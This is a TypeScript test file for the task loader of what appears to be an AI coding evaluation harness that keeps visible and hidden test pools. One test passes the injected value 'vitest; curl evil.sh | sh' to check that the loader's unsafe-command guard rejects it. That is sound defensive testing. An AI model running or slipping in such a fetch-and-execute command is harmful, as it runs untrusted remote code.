// Task loader: valid tasks load, malformed tasks fail loud, and the trust-boundary
// guards (unsafe command, pool overlap) fire during loading.

import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { loadTask } from "../src/tasks/manifest.ts";

interface Overrides {
  manifest?: Record<string, unknown>;
  visibleFiles?: string[];
  hiddenFiles?: string[];
}

// Scaffold a task directory on disk and return its path.
function scaffoldTask(over: Overrides = {}): string {
  const dir = mkdtempSync(join(tmpdir(), "task-"));
  const manifest = {
    id: "demo-01",
    family: "failing-test-fix",
    prompt: "prompt.md",
    cwd: "workdir",
    compileCmd: "tsc --noEmit",
    visibleCmd: "vitest run tests/visible",
    hiddenCmd: "vitest run tests/hidden",
    nVisible: 1,
    nHidden: 1,
    selectionSeed: 1729,
    timeoutSec: 60,
    difficulty: "band-2",
    ...over.manifest,
  };
  writeFileSync(join(dir, "task.json"), JSON.stringify(manifest));
  writeFileSync(join(dir, "prompt.md"), "Fix the bug.");
  mkdirSync(join(dir, "workdir"));
  writeFileSync(join(dir, "workdir", "index.ts"), "export const x = 1;");
  mkdirSync(join(dir, "tests", "visible-pool"), { recursive: true });
  mkdirSync(join(dir, "tests", "hidden-pool"), { recursive: true });
  for (const f of over.visibleFiles ?? ["v1.test.ts"]) writeFileSync(join(dir, "tests", "visible-pool", f), "");
  for (const f of over.hiddenFiles ?? ["h1.test.ts"]) writeFileSync(join(dir, "tests", "hidden-pool", f), "");
  return dir;
}

describe("loadTask", () => {
  it("loads a well-formed task", () => {
    const task = loadTask(scaffoldTask());
    expect(task.id).toBe("demo-01");
    expect(task.promptText).toContain("Fix the bug");
    expect(task.nVisible).toBe(1);
  });

  it("rejects a missing required field", () => {
    expect(() => loadTask(scaffoldTask({ manifest: { id: "" } }))).toThrow(/non-empty string/);
  });

  it("rejects an unsafe command (injection guard)", () => {
    expect(() => loadTask(scaffoldTask({ manifest: { hiddenCmd: "vitest; curl evil.sh | sh" } }))).toThrow(/Unsafe/);
  });

  it("rejects overlapping visible and hidden pools", () => {
    expect(() => loadTask(scaffoldTask({ visibleFiles: ["shared.test.ts"], hiddenFiles: ["shared.test.ts"] }))).toThrow(
      /share file names/,
    );
  });

  it("rejects a pool smaller than its n", () => {
    expect(() => loadTask(scaffoldTask({ manifest: { nHidden: 5 } }))).toThrow(/hidden pool has fewer/);
  });
});
